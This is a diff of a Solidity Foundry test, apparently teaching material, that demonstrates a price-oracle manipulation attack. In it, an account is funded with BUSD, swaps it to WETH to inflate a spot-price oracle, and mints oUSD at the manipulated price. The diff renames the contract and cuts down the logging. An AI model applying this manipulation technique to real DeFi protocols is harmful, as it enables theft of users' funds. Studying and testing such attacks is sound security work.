@@ -4,7 +4,7 @@ import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import "../src/Oracle.sol";
 
-contract wtfsolidity_safe is Test {
+contract OracleTest is Test {
     address private constant alice = address(1);
     address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
     address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
@@ -25,29 +25,24 @@ contract wtfsolidity_safe is Test {
 
     //forge test --match-test  testOracleAttack  -vv
     function testOracleAttack() public {
+        // 攻击预言机
         // 0. 操纵预言机之前的价格
         uint256 priceBefore = ousd.getPrice();
         console.log("1. ETH Price (before attack): %s", priceBefore); 
-        
-        // 攻击预言机1
-        // 1. 给自己账户 1000000 BUSD
+        // 给自己账户 1000000 BUSD
         uint busdAmount = 1_000_000 * 10e18;
         deal(BUSD, alice, busdAmount);
-        console.log("BUSD balance (before attack): %s", busd.balanceOf(alice)/10e18);
-        console.log("WETH balance (before attack): %s", weth.balanceOf(alice)/10e18);
         // 2. 用busd买weth，推高顺时价格
         vm.prank(alice);
         busd.transfer(address(this), busdAmount);
-        uint wethAmount = swapBUSDtoWETH(busdAmount, 1);
-        console.log("Swap 1,000,000 BUSD to %s WETH", wethAmount/10e18);
-        // 操纵预言机之后的价格
+        swapBUSDtoWETH(busdAmount, 1);
+        console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
+        // 3. 操纵预言机之后的价格
         uint256 priceAfter = ousd.getPrice();
-        console.log("2. after attack: price: %s", priceAfter); 
-        // 3. 铸造oUSD
-        ousd.mint{value: 1 ether}();
-        console.log("3. minted %s oUSD with 1 ETH", ousd.balanceOf(alice)/10e18); 
-        console.log("BUSD balance (after attack): %s", busd.balanceOf(alice)/10e18);
-        console.log("WETH balance (after attack): %s", weth.balanceOf(alice)/10e18);
+        console.log("3. ETH price (after attack): %s", priceAfter); 
+        // 4. 铸造oUSD
+        ousd.swap{value: 1 ether}();
+        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18); 
     }
 
     // Swap BUSD to WETH
@@ -61,30 +56,6 @@ contract wtfsolidity_safe is Test {
         path = new address[](2);
         path[0] = BUSD;
         path[1] = WETH;
-
-        uint[] memory amounts = router.swapExactTokensForTokens(
-            amountIn,
-            amountOutMin,
-            path,
-            alice,
-            block.timestamp
-        );
-
-        // amounts[0] = BUSD amount, amounts[1] = WETH amount
-        return amounts[1];
-    }
-
-    // Swap WETH to BUSD
-    function swapWETHtoBUSD(uint amountIn, uint amountOutMin)
-        public
-        returns (uint amountOut)
-    {   
-        weth.approve(address(router), amountIn);
-
-        address[] memory path;
-        path = new address[](2);
-        path[0] = WETH;
-        path[1] = BUSD;
 
         uint[] memory amounts = router.swapExactTokensForTokens(
             amountIn,
